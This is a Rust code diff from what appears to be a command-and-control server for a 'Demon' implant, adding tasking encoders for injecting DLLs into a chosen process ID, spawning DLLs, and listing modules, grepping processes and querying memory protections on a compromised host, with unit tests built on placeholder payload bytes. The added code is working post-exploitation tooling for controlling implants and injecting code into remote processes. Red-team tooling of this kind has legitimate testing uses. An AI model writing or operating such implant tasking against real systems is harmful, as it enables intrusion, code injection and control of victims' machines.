@@ -1047,6 +1047,14 @@ fn task_payload(
         return encode_kerberos_payload(info);
     }
 
+    if command == u32::from(DemonCommand::CommandInjectDll) {
+        return encode_inject_dll_payload(info);
+    }
+
+    if command == u32::from(DemonCommand::CommandSpawnDll) {
+        return encode_spawn_dll_payload(info);
+    }
+
     Ok(Vec::new())
 }
 
@@ -1265,10 +1273,24 @@ fn encode_proc_command_payload(
             write_u32(&mut payload, u32::from(piped));
             write_u32(&mut payload, u32::from(verbose));
         }
-        other => {
-            return Err(AgentCommandError::UnsupportedProcessSubcommand {
-                subcommand: u32::from(other).to_string(),
-            });
+        DemonProcessCommand::Modules => {
+            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
+            write_u32(&mut payload, pid);
+        }
+        DemonProcessCommand::Grep => {
+            let pattern = required_string(info, &["Args", "Arguments"], "Args")?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern));
+        }
+        DemonProcessCommand::Memory => {
+            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
+            let parts = arguments.split_whitespace().collect::<Vec<_>>();
+            if parts.len() < 2 {
+                return Err(AgentCommandError::MissingField { field: "Args" });
+            }
+            let pid = parse_u32_field("PID", parts[0])?;
+            let protection = parse_memory_protection(parts[1])?;
+            write_u32(&mut payload, pid);
+            write_u32(&mut payload, protection);
         }
     }
 
@@ -1454,6 +1476,38 @@ fn encode_kerberos_payload(
     Ok(payload)
 }
 
+fn encode_inject_dll_payload(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let technique = optional_u32(info, &["Technique"]).unwrap_or(0);
+    let pid = required_u32(info, &["PID"], "PID")?;
+    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
+    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
+    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();
+
+    let mut payload = Vec::new();
+    write_u32(&mut payload, technique);
+    write_u32(&mut payload, pid);
+    write_len_prefixed_bytes(&mut payload, &loader);
+    write_len_prefixed_bytes(&mut payload, &binary);
+    write_len_prefixed_bytes(&mut payload, &arguments);
+    Ok(payload)
+}
+
+fn encode_spawn_dll_payload(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
+    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
+    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();
+
+    let mut payload = Vec::new();
+    write_len_prefixed_bytes(&mut payload, &loader);
+    write_len_prefixed_bytes(&mut payload, &binary);
+    write_len_prefixed_bytes(&mut payload, &arguments);
+    Ok(payload)
+}
+
 fn proc_subcommand(
     info: &red_cell_common::operator::AgentTaskInfo,
 ) -> Result<DemonProcessCommand, AgentCommandError> {
@@ -1461,7 +1515,10 @@ fn proc_subcommand(
         .or_else(|| info.sub_command.clone())
         .ok_or(AgentCommandError::MissingField { field: "ProcCommand" })?;
     match raw.trim().to_ascii_lowercase().as_str() {
+        "2" | "modules" => Ok(DemonProcessCommand::Modules),
+        "3" | "grep" => Ok(DemonProcessCommand::Grep),
         "4" | "create" => Ok(DemonProcessCommand::Create),
+        "6" | "memory" => Ok(DemonProcessCommand::Memory),
         "7" | "kill" => Ok(DemonProcessCommand::Kill),
         _ => Err(AgentCommandError::UnsupportedProcessSubcommand { subcommand: raw }),
     }
@@ -1597,6 +1654,24 @@ fn parse_injection_way(value: &str) -> Result<DemonInjectWay, AgentCommandError>
     }
 }
 
+fn parse_memory_protection(value: &str) -> Result<u32, AgentCommandError> {
+    match value.to_ascii_uppercase().as_str() {
+        "PAGE_NOACCESS" => Ok(0x01),
+        "PAGE_READONLY" => Ok(0x02),
+        "PAGE_READWRITE" => Ok(0x04),
+        "PAGE_WRITECOPY" => Ok(0x08),
+        "PAGE_EXECUTE" => Ok(0x10),
+        "PAGE_EXECUTE_READ" => Ok(0x20),
+        "PAGE_EXECUTE_READWRITE" => Ok(0x40),
+        "PAGE_EXECUTE_WRITECOPY" => Ok(0x80),
+        "PAGE_GUARD" => Ok(0x100),
+        _ => Err(AgentCommandError::InvalidNumericField {
+            field: "MemoryProtection".to_owned(),
+            value: value.to_owned(),
+        }),
+    }
+}
+
 fn parse_injection_technique(value: &str) -> Result<u32, AgentCommandError> {
     match value.trim().to_ascii_lowercase().as_str() {
         "default" => Ok(0),
@@ -1630,6 +1705,10 @@ fn required_u32(
 ) -> Result<u32, AgentCommandError> {
     let value = required_string(info, keys, field)?;
     parse_u32_field(field, &value)
+}
+
+fn optional_u32(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<u32> {
+    string_field(info, keys).and_then(|value| value.trim().parse::<u32>().ok())
 }
 
 fn optional_base64(
@@ -2556,6 +2635,150 @@ mod tests {
                 .expect("final memfile id should exist"),
         );
         assert_eq!(memfile_id, final_memfile_id);
+    }
+
+    #[test]
+    fn build_job_encodes_inject_dll_payload() {
+        let loader = BASE64_STANDARD.encode([0xCC_u8, 0xDD, 0xEE]);
+        let binary = BASE64_STANDARD.encode([0x4D_u8, 0x5A, 0x90, 0x00]);
+        let arguments = BASE64_STANDARD.encode("test-arg");
+        let job = build_job(&AgentTaskInfo {
+            task_id: "30".to_owned(),
+            command_line: "inject-dll 1234 payload.dll".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
+            extra: BTreeMap::from([
+                (String::from("PID"), Value::String("1234".to_owned())),
+                (String::from("DllLoader"), Value::String(loader)),
+                (String::from("Binary"), Value::String(binary)),
+                (String::from("Arguments"), Value::String(arguments)),
+                (String::from("Technique"), Value::String("0".to_owned())),
+            ]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("inject dll job should build");
+
+        assert_eq!(job.command, u32::from(DemonCommand::CommandInjectDll));
+        let mut offset = 0usize;
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 1234);
+        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0xCC, 0xDD, 0xEE]);
+        assert_eq!(
+            read_len_prefixed_bytes(&job.payload, &mut offset),
+            vec![0x4D, 0x5A, 0x90, 0x00]
+        );
+        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), b"test-arg".to_vec());
+    }
+
+    #[test]
+    fn build_job_encodes_inject_dll_with_default_technique() {
+        let loader = BASE64_STANDARD.encode([0xAA_u8]);
+        let binary = BASE64_STANDARD.encode([0xBB_u8]);
+        let job = build_job(&AgentTaskInfo {
+            task_id: "31".to_owned(),
+            command_line: "inject-dll 5555 minimal.dll".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
+            extra: BTreeMap::from([
+                (String::from("PID"), Value::String("5555".to_owned())),
+                (String::from("DllLoader"), Value::String(loader)),
+                (String::from("Binary"), Value::String(binary)),
+            ]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("inject dll job should build with default technique");
+
+        let mut offset = 0usize;
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 5555);
+    }
+
+    #[test]
+    fn build_job_encodes_spawn_dll_payload() {
+        let loader = BASE64_STANDARD.encode([0x11_u8, 0x22, 0x33]);
+        let binary = BASE64_STANDARD.encode([0x4D_u8, 0x5A]);
+        let arguments = BASE64_STANDARD.encode("spawn-args");
+        let job = build_job(&AgentTaskInfo {
+            task_id: "32".to_owned(),
+            command_line: "spawn-dll payload.dll".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandSpawnDll).to_string(),
+            extra: BTreeMap::from([
+                (String::from("DllLoader"), Value::String(loader)),
+                (String::from("Binary"), Value::String(binary)),
+                (String::from("Arguments"), Value::String(arguments)),
+            ]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("spawn dll job should build");
+
+        assert_eq!(job.command, u32::from(DemonCommand::CommandSpawnDll));
+        let mut offset = 0usize;
+        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0x11, 0x22, 0x33]);
+        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), vec![0x4D, 0x5A]);
+        assert_eq!(read_len_prefixed_bytes(&job.payload, &mut offset), b"spawn-args".to_vec());
+    }
+
+    #[test]
+    fn build_job_encodes_process_modules_payload() {
+        let job = build_job(&AgentTaskInfo {
+            task_id: "33".to_owned(),
+            command_line: "proc modules 8888".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandProc).to_string(),
+            sub_command: Some("modules".to_owned()),
+            extra: BTreeMap::from([(String::from("Args"), Value::String("8888".to_owned()))]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("proc modules job should build");
+
+        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
+        let mut offset = 0usize;
+        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Modules));
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 8888);
+    }
+
+    #[test]
+    fn build_job_encodes_process_grep_payload() {
+        let job = build_job(&AgentTaskInfo {
+            task_id: "34".to_owned(),
+            command_line: "proc grep svchost".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandProc).to_string(),
+            sub_command: Some("grep".to_owned()),
+            extra: BTreeMap::from([(String::from("Args"), Value::String("svchost".to_owned()))]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("proc grep job should build");
+
+        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
+        let mut offset = 0usize;
+        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Grep));
+        let grep_pattern = decode_utf16(read_len_prefixed_bytes(&job.payload, &mut offset));
+        assert_eq!(grep_pattern, "svchost");
+    }
+
+    #[test]
+    fn build_job_encodes_process_memory_payload() {
+        let job = build_job(&AgentTaskInfo {
+            task_id: "35".to_owned(),
+            command_line: "proc memory 4321 PAGE_EXECUTE_READWRITE".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandProc).to_string(),
+            sub_command: Some("memory".to_owned()),
+            extra: BTreeMap::from([(
+                String::from("Args"),
+                Value::String("4321 PAGE_EXECUTE_READWRITE".to_owned()),
+            )]),
+            ..AgentTaskInfo::default()
+        })
+        .expect("proc memory job should build");
+
+        assert_eq!(job.command, u32::from(DemonCommand::CommandProc));
+        let mut offset = 0usize;
+        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Memory));
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 4321);
+        assert_eq!(read_u32_le(&job.payload, &mut offset), 0x40);
     }
 
     #[tokio::test]
